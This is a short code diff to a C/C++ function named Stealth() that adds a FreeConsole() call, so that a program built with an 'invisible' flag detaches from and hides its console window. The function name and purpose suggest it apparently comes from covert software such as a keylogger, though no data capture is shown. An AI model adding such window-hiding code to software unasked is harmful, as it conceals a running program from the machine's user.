@@ -191,6 +191,7 @@ void Stealth()
 
 #ifdef invisible
 	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
 #endif
 }
 
